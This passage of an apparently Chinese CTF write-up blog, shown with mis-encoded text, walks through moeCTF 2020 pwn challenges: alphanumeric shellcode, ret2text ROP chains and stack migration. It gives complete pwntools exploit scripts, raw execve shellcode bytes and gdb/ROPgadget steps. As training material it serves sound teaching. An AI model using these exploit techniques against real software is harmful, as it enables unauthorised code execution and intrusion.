<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sc.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> asm(sc)</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºé‡å®šå‘è‡³æ–‡æœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sc.py &gt; sc</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨è½®å­ç”Ÿæˆalphanumeric shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python ./ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">"sc"</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/10/Bg5T7zeZVOWsJ9K.png" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00</span><br></pre></td></tr></table></figure>



<p>è¿æ¥æœåŠ¡ç«¯ï¼Œå‘é€æˆ‘ä»¬çš„alphanumeric shellcodeï¼ŒæˆåŠŸgetshell</p>
<p><img src="https://i.loli.net/2020/08/10/b5Ru7PmDZasA1jI.png" alt="image.png"></p>
<p>å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Y0u_kn3w_tH3_a1ph4num3r1C_she1lc0de!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ROP1-ret2text"><a href="#ROP1-ret2text" class="headerlink" title="ROP1 - ret2text"></a>ROP1 - ret2text</h2><p> <a href="/download/moectf2020/pwn/rop1/rop1"ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜"">ç‚¹å‡»ä¸‹è½½-rop1</a> </p>
<p>ROPå³ä¸º<strong>Return-Oriented Programming â€”â€”è¿”å›å¯¼å‘ç¼–ç¨‹</strong>ï¼Œ æ˜¯ä¸€ç§å¯ä»¥ç”¨æ¥ç»•è¿‡ç°ä»£æ“ä½œç³»ç»Ÿçš„å„ç§é€šç”¨é˜²å¾¡ï¼ˆæ¯”å¦‚å†…å­˜ä¸å¯æ‰§è¡Œå’Œä»£ç ç­¾åç­‰ï¼‰çš„é«˜çº§çš„å†…å­˜æ”»å‡»æŠ€æœ¯ã€‚</p>
<blockquote>
<p>å…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨<strong>æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ (gadgets) æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</strong>æ‰€è°“ gadgets å°±æ˜¯ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ </p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">ctf-wifiï¼šBasic ROP</a></p>
</blockquote>
<p>é¦–å…ˆåœ¨Linuxä¸‹ä½¿ç”¨<code>checksec</code>æŒ‡ä»¤åˆ†æï¼Œå‘ç°å…¶å¼€å¯äº†<strong>æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</strong></p>
<p><img src="https://i.loli.net/2020/08/06/CmTilx3bQBschY8.png" alt="image.png"></p>
<p>å°†ç¨‹åºæ‹–å…¥IDAåˆ†æï¼Œå‘ç°å­˜åœ¨<code>gets</code>å‡½æ•°ï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨æ ˆæº¢å‡º</p>
<p><img src="https://i.loli.net/2020/08/06/rfdg523GS6IOy7k.png" alt="image.png"></p>
<p>æˆ‘ä»¬å°è¯•å°†æ–­ç‚¹ä¸‹åœ¨<code>call _gets</code>ï¼Œå³<code>0x40087f</code>çš„åœ°ä»¥è®¡ç®—åç§»é‡</p>
<p><img src="https://i.loli.net/2020/08/06/1pKo5GdSW3Jf42u.png" alt="image.png"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gdb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> file rop1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> b *0x40087f</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> r</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/06/oQREW8CdHIU59ai.png" alt="image.png"></p>
<p>ç”±<code>lea rax, [rbp-0x80]</code>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥å­—ç¬¦ä¸²ä¸ºåŸºäºrbpçš„ç´¢å¼•ï¼Œæ•…å…¶ç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»å³ä¸º<code>0x80+8</code>ï¼Œä¹Ÿå°±æ˜¯<strong>128ä¸ªå­—èŠ‚å†åŠ ä¸Š8å­—èŠ‚çš„rbp</strong>ï¼Œä¹‹åå°±æ˜¯<strong>å‡½æ•°çš„è¿”å›åœ°å€</strong></p>
<p>å› æ­¤æˆ‘ä»¬æ„é€ çš„payloadåŸºç¡€æ¨¡å‹åº”å½“æ˜¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target_addr = p64(addr_of_target)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">128</span> + target_addr</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å°±åº”è¯¥å¼€å§‹å¯»æ‰¾éœ€è¦ç”¨çš„<strong>gadgetï¼ˆç¨‹åºå°ç‰‡æ®µï¼‰</strong>äº†</p>
<p>ä¸€èˆ¬æ¥è¯´åªè¦æ‰¾åˆ°<code>system(&quot;/bin/sh&quot;)</code>å°±å¯ä»¥getshelläº†</p>
<p>ç„¶è€Œæˆ‘ä»¬ä¸éš¾çœ‹å‡ºï¼Œç¨‹åºä¸­è™½ç„¶å­˜åœ¨ç€systemå‡½æ•°ï¼Œä½†æ˜¯å´æ˜¯<code>system(&quot;eqqie&quot;)</code>ã€‚ã€‚ã€‚</p>
<p><img src="https://i.loli.net/2020/08/06/ZGdgYATBi8L2fwm.png" alt="image.png"></p>
<p>å› æ­¤å¾ˆæ˜æ˜¾æˆ‘ä»¬ä¸èƒ½ç›´æ¥è¿”å›åˆ°è¿™ä¸ªå‡½æ•°çš„åœ°å€ä¸Š</p>
<p>ä½†æ˜¯è¿™ä¹Ÿå‘Šè¯‰æˆ‘ä»¬æœ‰<code>systemå‡½æ•°</code>çš„gadgetï¼Œæ¥ä¸‹æ¥åªéœ€è¦å†æ‰¾åˆ°<code>/bin/sh</code>å­—ç¬¦ä¸²å°±å¯ä»¥å‡‘å‡º<code>system(&#39;/bin/sh&#39;)</code></p>
<p>æˆ‘ä»¬å¾ˆå®¹æ˜“åœ¨<code>.data</code>æ®µæ‰¾åˆ°<code>&quot;/bin/sh&quot;</code></p>
<p><img src="https://i.loli.net/2020/08/06/8jlm6eZaWA1uMx5.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/08/06/IvTARLHcFo97XyS.png" alt="image.png"></p>
<p>ä¸32ä½ç¨‹åºæ‰€ä¸åŒçš„æ˜¯ï¼Œ64ä½ç¨‹åºå‚æ•°<strong>é¦–å…ˆé€šè¿‡rdi,rsi,rdx,rcx,r8,r9è¿™å…­ä¸ªå¯„å­˜å™¨è¿›è¡Œä¼ é€’</strong></p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å…ˆåœ¨<code>rdiå¯„å­˜å™¨</code>å†…å†™å…¥<code>&quot;/bin/sh&quot;</code>çš„åœ°å€å†è°ƒç”¨systemå‡½æ•°å³å¯getshell</p>
<p>ä½†æ˜¯æˆ‘ä»¬ç›´æ¥æ‰¾ä¼¼ä¹æ‰¾ä¸åˆ°<code>pop rdi</code></p>
<p>åˆ«æ…Œwwwï¼Œåœ¨IDAå†…æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€æ®µæŒ‡ä»¤æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop r15</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/06/BgKRwnzp5yTH7l8.png" alt="image.png"></p>
<p>æŒ‰ä¸‹<code>D</code>å±•å¼€å˜æˆæ•°æ®</p>
<p><img src="https://i.loli.net/2020/08/06/XFxkV5w7uSKMmRG.png" alt="image.png"></p>
<p>å†æŒ‰ä¸‹<code>C</code>å˜æˆæŒ‡ä»¤</p>
<p><img src="https://i.loli.net/2020/08/06/MK2JW16oy3Db8FB.png" alt="image.png"></p>
<p>å¾—åˆ°æŒ‡ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rdi</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>äºæ˜¯æˆ‘ä»¬å°±æˆåŠŸå¾—åˆ°äº†<strong>æ”¹å˜rdiå¯„å­˜å™¨çš„gadgetçš„åœ°å€</strong></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥æ„é€ payloadäº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'rop1'</span>)<span class="comment">#p = remote('sec.eqqie.cn',10004)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = p64(<span class="number">0x400933</span>)</span><br><span class="line">sh_addr = p64(<span class="number">0x601070</span>)</span><br><span class="line">call_sys = p64(<span class="number">0x4007df</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">136</span> + pop_rdi + sh_addr + call_sys</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿æ¥æœåŠ¡å™¨ï¼Œä½¿ç”¨æˆ‘ä»¬çš„payloadæ¥getshell</p>
<p><img src="https://i.loli.net/2020/08/06/yPLIicR9daTVWB8.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/08/06/1fT5rBh23v6sayX.png" alt="image.png"></p>
<p>å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;67d14388-9052-4182-869c-5e5f0cdac4e5&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ³¨ï¼šä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·<code>ROPgadget</code>æ¥å¯»æ‰¾gadget</p>
<p>Linuxä¸‹ï¼Œä¸Šé¢å¯»æ‰¾gadgetçš„æ­¥éª¤ä¹Ÿå¯ä»¥å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary rop1 --string <span class="string">'/bin/sh'</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/06/XOmzb8AWo92nvBi.png" alt="image.png"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary rop1 --only <span class="string">'pop|ret'</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/06/tLToxVk8Cz19ARP.png" alt="image.png"></p>
</blockquote>
<blockquote>
<p>å‚è€ƒèµ„æ–™ï¼š<a href="https://www.cnblogs.com/ichunqiu/p/9288935.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/9288935.html</a></p>
</blockquote>
<h2 id="ROP2-ret2text"><a href="#ROP2-ret2text" class="headerlink" title="ROP2 - ret2text"></a>ROP2 - ret2text</h2><p> <a href="/download/moectf2020/pwn/rop2/rop2"ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜"">ç‚¹å‡»ä¸‹è½½-rop2</a> </p>
<p>é¦–å…ˆä½¿ç”¨<code>checksec</code>æŒ‡ä»¤ï¼Œå‘ç°å…¶å­˜åœ¨<strong>æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</strong></p>
<p><img src="https://i.loli.net/2020/08/06/HDUg72BPC94AzJO.png" alt="image.png"></p>
<p>æ‹–è¿›IDAï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸€é¢˜å’ŒROP1åŸºæœ¬ä¸Šæ²¡æœ‰å¤ªå¤§çš„ä¸åŒï¼Œéƒ½æ˜¯ç›´æ¥å­˜åœ¨getså‡½æ•°çš„æº¢å‡ºæ¼æ´</p>
<p><img src="https://i.loli.net/2020/08/06/CYwqLfMRsyBxHK1.png" alt="image.png"></p>
<p>ä»¥åŠ<code>system</code>å‡½æ•°çš„gadgetå’Œ<code>pop rdi</code>çš„gadget</p>
<p><img src="https://i.loli.net/2020/08/06/tHY6GJM3NWE8jUk.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/08/06/mLMFVgjHt5DzBas.png" alt="image.png"></p>
<p>ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸€æ¬¡å¹¶æ²¡æœ‰ç»™æˆ‘ä»¬é¢„ç•™ä¸‹å¯ä»¥åˆ©ç”¨çš„<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²</p>
<p><img src="https://i.loli.net/2020/08/06/BsmoxyjT8bOnvuh.png" alt="image.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥æ‰‹åŠ¨è¯»å…¥<code>/bin/sh</code>å­—ç¬¦ä¸²å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„</p>
<p>é¦–å…ˆå­˜åœ¨<code>gets()</code>å‡½æ•°å¯ä»¥è¯»å…¥å­—ç¬¦ä¸²</p>
<p><img src="https://i.loli.net/2020/08/09/vxIF8c1b4ATqtQW.png" alt="image.png"></p>
<p>å…¶æ¬¡æˆ‘ä»¬åœ¨IDAä¸­æŒ‰ä¸‹<code>CTRL + S</code>ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªå¯ä»¥ä¾›æˆ‘ä»¬è¯»å†™çš„<code>.bss</code>æ®µ</p>
<p><img src="https://i.loli.net/2020/08/09/hdC8S9FJGPBUbQl.png" alt="image.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å°†<code>/bin/sh</code>å­—ç¬¦ä¸²è¯»åˆ°è¿™ä¸ªæ®µä¸Šï¼Œå†å°†ä¹‹ä½œä¸º<code>system</code>å‡½æ•°çš„å‚æ•°å³å¯<code>getshell</code></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'rop2'</span>)</span><br><span class="line">gets_addr = p64(e.symbols[<span class="string">'gets'</span>])</span><br><span class="line">sys_addr = p64(e.symbols[<span class="string">'system'</span>])</span><br><span class="line">pop_rdi = p64(<span class="number">0x400933</span>)</span><br><span class="line">bss_addr = p64(<span class="number">0x601080</span>)<span class="comment">#ä¹Ÿå¯ä»¥ç”¨ e.bss() å¿«é€Ÿè·å–å¯è¯»å†™.bssæ®µåœ°å€</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">136</span> + pop_rdi + bss_addr + gets_addr + pop_rdi + bss_addr + sys_addr</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'rop2'</span>)<span class="comment">#p = remote('sec.eqqie.cn',10005)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿æ¥æœåŠ¡å™¨ï¼Œå‘é€æˆ‘ä»¬çš„payloadï¼Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/08/09/fIoZyxE7F5biUQz.png" alt="image.png"></p>
<p>å¾—åˆ°flagï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;d44bc3cb-471b-4906-822b-ea5cb32c4acb&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Tips:</p>
<p>pwntoolsé‡Œçš„ELFæ¨¡å—å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿæ‰¾åˆ°ä¸€äº›éœ€è¦çš„åœ°å€</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#basic usage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">'file_name'</span>)	<span class="comment"># name of the file you're going to pwn</span></span><br><span class="line"></span><br><span class="line">e.symbols[<span class="string">'func_name'</span>]	<span class="comment"># to get the address of function-calling instruction quickly</span></span><br><span class="line"></span><br><span class="line">e.bss()					<span class="comment"># to get the address of a readable and writable </span></span><br><span class="line">						<span class="comment"># bss address quickly</span></span><br><span class="line"></span><br><span class="line">e.plt[<span class="string">'func_name'</span>]		<span class="comment"># to get the address of function-calling instruction</span></span><br><span class="line">						<span class="comment"># of function in .plt table quickly</span></span><br><span class="line">						<span class="comment"># usually the same result with symbol['f_name']</span></span><br><span class="line">        </span><br><span class="line">e.got[<span class="string">'func_name'</span>]		<span class="comment"># similar with the former one, which used to get .got table</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="baby-migration-stack-migration-ret2shellcode"><a href="#baby-migration-stack-migration-ret2shellcode" class="headerlink" title="baby migration - stack migration + ret2shellcode"></a>baby migration - stack migration + ret2shellcode</h2><p> <a href="/download/moectf2020/pwn/baby_migration/baby_migration">ç‚¹å‡»ä¸‹è½½-baby_migration</a> </p>
<p>é¦–å…ˆæ˜¯æƒ¯ä¾‹çš„<code>checksec</code></p>
<p><img src="https://i.loli.net/2020/08/24/4HjdZqlBKp1fIrG.png" alt="image.png"></p>
<p>å››èˆäº”å…¥ä¿æŠ¤å…¨å…³</p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/08/24/vf4jkEraNHWARhq.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å­˜åœ¨æ ˆæº¢å‡ºï¼Œå¯ä¾›æº¢å‡ºå­—èŠ‚ä¸º<code>66-0x30=18</code>ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´åŸºæœ¬ä¸Šåªå¤Ÿè¦†ç›–rbpï¼ˆ8å­—èŠ‚ï¼‰+è¿”å›åœ°å€ï¼ˆ8å­—èŠ‚ï¼‰ï¼Œç©ºé—´ååˆ†æ‹¥æŒ¤ï¼ŒåŒæ—¶ç¨‹åºé‡Œä¹Ÿæ²¡æœ‰èƒ½å¤Ÿç›´æ¥åˆ©ç”¨çš„gadget</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°åœ¨<code>bssæ®µ</code>æœ‰æå¤§çš„å¯è¯»å†™ç©ºé—´</p>
<p><img src="https://i.loli.net/2020/08/24/1Id5CqOT92ui4ZH.png" alt="image.png"></p>
<p>æ•…è€ƒè™‘<strong>æ ˆè¿ç§»</strong>ï¼Œå°†æ ˆè¿ç§»åˆ°bssæ®µå†æ”¾ä¸Šæˆ‘ä»¬çš„shellcode</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x30</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line">back_to_gets = <span class="number">0x4011c8</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">payload1 = <span class="string">b'A'</span>*offset + p64(bss+<span class="number">500</span>) + p64(back_to_gets)</span><br><span class="line">payload2 = sc + <span class="string">b'A'</span>*(offset - len(sc)) + p64(bss+<span class="number">500</span>) + p64(bss+<span class="number">500</span>-offset)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./baby_migration'</span>)<span class="comment">#p = remote('sec.arttnba3.cn', 10002)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¾—flag</p>
<p><img src="https://i.loli.net/2020/08/24/gY1Fxk7GERTjSBr.png" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;5tack_m1gr@ti0n_1s_e4sy!&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä»¥ä¸‹å†…å®¹æ¥è‡ª<a href="https://arttnba3.cn" target="_blank" rel="noopener">arttnba3.cn</a>ï¼š</p>
<p>å¦‚ä½•å°†ä¸€ä¸ªæ ˆåŠ«æŒåˆ°åˆ«çš„åœ°æ–¹ï¼Ÿæ ˆè¿ç§»çš„è¿è¡ŒåŸç†ç©¶ç«Ÿæ˜¯ï¼Ÿ</p>
<p>åšäº†é‚£ä¹ˆå¤šçš„pwné¢˜ï¼ˆ<del>æŒ‡moeCTF2020åˆšåˆšå¼€å§‹åš</del>ï¼ˆğŸ‘ˆæŠŠè¿™ä¸ªå®¶ä¼™æ‹–å‡ºå»ğŸ”¨äº†ï¼‰ï¼‰ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“åœ¨æ„é€ æ ˆæº¢å‡ºçš„ropé“¾æ—¶ä¸ä»…è¦ç®—ä¸Šæ ˆåŸæœ¬æ‰€åˆ†é…çš„ç©ºé—´çš„å¤§å°ï¼Œè¿˜è¦ç®—ä¸Š<code>ebp/rbp</code>å¯„å­˜å™¨æ‰€å ç”¨çš„4/8ä¸ªå­—èŠ‚ï¼Œä¹‹åæ‰åˆ°å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ä¸€ä¸ªå‡½æ•°å¯åŠ¨æ—¶ï¼Œä¼šå…ˆå°†ebp/rbpçš„å€¼å‹å…¥æ ˆä¸­ï¼Œä¹‹åå°†æŒ‡å‘æ ˆé¡¶çš„esp/rspå¯„å­˜å™¨çš„å€¼èµ‹ç»™ebp/rbpå¯„å­˜å™¨ï¼Œéšåé€šè¿‡ebp/rbpå¯„å­˜å™¨æ¥å®ç°å¯¹æ ˆçš„è®¿é—®</p>
<p><img src="https://i.loli.net/2020/08/24/U8f5Y1CJrsdVT69.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/08/24/jQkcHxb5MgARspU.png" alt="image.png"></p>
<p>åŒæ ·çš„ï¼Œæœ‰å‹æ ˆåŒæ ·å°±ä¼šæœ‰å‡ºæ ˆæ¥æ¢å¤ebp/rbpä¸esp/rspçš„å€¼ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“åœ¨å‡½æ•°è¿è¡Œåˆ°æœ«å°¾æ—¶ï¼Œä¼šæ‰§è¡Œ<code>leave</code>ï¼Œ<code>retn</code>ä¸¤æ¡æŒ‡ä»¤</p>
<p><img src="https://i.loli.net/2020/08/24/v79Elx15bWXdyoZ.png" alt="image.png"></p>
<p>å…¶ä¸­<code>leave</code>æŒ‡ä»¤ä¾¿æ˜¯ç”¨æ¥æ¢å¤æ ˆå¸§çš„æŒ‡ä»¤ï¼Œå®ƒç­‰ä»·äºå¦‚ä¸‹æŒ‡ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;ebp &amp; esp in 32-bit</span><br><span class="line">mov rsp, rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure>

<p>ç”±äº<strong>å¯¹æ ˆçš„è®¿é—®éƒ½æ˜¯é€šè¿‡ebp/rbpè¿›è¡Œçš„</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œåªè¦æˆ‘ä»¬åœ¨æº¢å‡ºæ—¶<strong>è¦†å†™æ‰æ ˆå†…å‚¨å­˜çš„åŸebp/rbpçš„å€¼</strong>ï¼Œ<strong>åœ¨retnæŒ‡ä»¤è¿”å›åç¨‹åºæ‰€åˆ¤å®šçš„æ ˆåŸºå€å…¶å®å°±å˜æˆäº†æˆ‘ä»¬æ‰€è¦†å†™ä¸Šçš„é‚£ä¸ªåœ°å€</strong>ï¼Œä¹‹åç¨‹åºåœ¨è°ƒç”¨æ ˆä¸Šçš„å˜é‡çš„æ—¶å€™å…¶å®éƒ½æ˜¯åŸºäºæˆ‘ä»¬æ‰€è¦†å†™ä¸Šçš„æ–°çš„æ ˆåŸºå€è¿›è¡Œæ“ä½œçš„äº†ï¼Œç›¸å½“äºæŠŠæ ˆåŠ«æŒåˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼Œæ‰€ä»¥åˆå«<strong>æ ˆåŠ«æŒ</strong></p>
</blockquote>
<h2 id="Hard-shellcode-ret2shellcode"><a href="#Hard-shellcode-ret2shellcode" class="headerlink" title="Hard shellcode - ret2shellcode"></a>Hard shellcode - ret2shellcode</h2><p> <a href="/download/moectf2020/pwn/hard_shellcode/hard_shellcode"ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜"">ç‚¹å‡»ä¸‹è½½-hard_shellcode</a> </p>
<p>é¦–å…ˆæ˜¯æƒ¯ä¾‹çš„<code>checksec</code></p>
<p><img src="https://i.loli.net/2020/08/09/hkzgUZj8rYPoFI3.png" alt="image.png"></p>
<p>ä¿æŠ¤å…¨å…³ï¼Œä¼¼ä¹æ•´æŒºå¥½</p>
<p>ä¸è¿‡è¿™é¢˜çš„åˆ†å€¼æ¯”rop2è¿˜è¦é«˜100åˆ†ï¼Œå°å¿ƒä¸ºå¦™XD</p>
<p>æ‹–å…¥IDAçœ‹çœ‹</p>
<p><img src="https://i.loli.net/2020/08/09/GdmDsjEnXpBqobO.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¯»å…¥0x50ä¸ªå­—èŠ‚ï¼Œbufå¤§å°ä¸º0x40ï¼Œ<strong>å­˜åœ¨æ ˆæº¢å‡º</strong></p>
